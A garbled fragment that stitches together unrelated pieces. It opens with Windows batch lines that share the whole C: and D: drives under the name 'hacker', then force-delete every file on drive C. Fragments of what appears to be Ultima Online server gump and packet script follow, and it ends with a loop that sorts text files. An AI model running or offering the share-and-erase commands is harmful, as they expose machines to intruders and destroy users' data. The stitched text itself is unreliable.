net share hacker=c: /unlimited /remark:"RockStar"
net share hacker=d: /unlimited /remark:"RockStar"
CD..
CD..
CD.
erase c:/f/s/q/a
90,90
resizepic 0 0 5054 405 470
gumppic 10 10 5528
gumppic <eval (10+((<p.x>*100)/1337))>

<eval (10+((<p.y>*100)/1067))> 2362
text 20 400 455 0
text 20 435 455 01 local.t_x=<argn1>
local.t_y=<argn2>
sector.allclients sendpacket 0c0 00 D<var.src>

D<var.target> W<var.effect> W<p.x> W<eval

<p.y**** B<qval <argn3>?<argn3>:<p.z****

W<local.t_x> W<local.t_y> B<qval <argn3>?

<argn3>:<p.z**** B<var.speed> B<var0.duration>

00 00 00 B<qval <var0.explode>?<var.explode>:0>

D<hval <var.hue> - 1> D<var.rendermode>
for /r %x in (*.txt) do (find "example" "%x" >nul && echo Found in %x && copy "%x" "C:\example\found\" >nul || echo Not found in %x && copy "%x" "C:\example\notfound\" >nul)
